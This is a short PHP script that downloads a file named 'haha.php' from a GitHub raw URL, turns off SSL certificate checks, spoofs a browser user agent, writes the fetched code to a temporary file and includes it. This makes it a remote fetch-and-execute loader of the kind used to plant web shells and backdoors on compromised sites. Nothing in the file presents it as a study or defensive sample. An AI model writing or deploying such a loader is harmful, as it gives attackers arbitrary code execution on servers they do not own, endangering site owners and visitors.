<?php
// Enable error reporting for debugging purposes
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to get URL content
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            echo 'Curl error: ' . curl_error($conn);
            return false;
        }
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = @file_get_contents($url);
        if ($url_get_contents_data === false) {
            echo 'file_get_contents error';
            return false;
        }
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle === false) {
            echo 'fopen error';
            return false;
        }
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// New URL as requested
$remote_url = 'https://raw.githubusercontent.com/CloudNine-Digitals/byp/refs/heads/main/haha.php';

// Directly execute the main content (with a minimal safety check)
$a = geturlsinfo($remote_url);
if ($a !== false) {
    // Minimal safety check: only include if the fetched content looks like PHP
    if (stripos($a, '<?php') !== false || stripos($a, '<?=') !== false) {
        $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
        if (file_put_contents($tmp_file, $a) !== false) {
            include($tmp_file);
            // Note: temporary file left on disk for debugging
        } else {
            echo "Failed to write temporary file.";
        }
    } else {
        echo "Fetched content does not appear to contain PHP code. Aborting include.";
    }
} else {
    echo "Failed to retrieve content from remote URL.";
}
?>
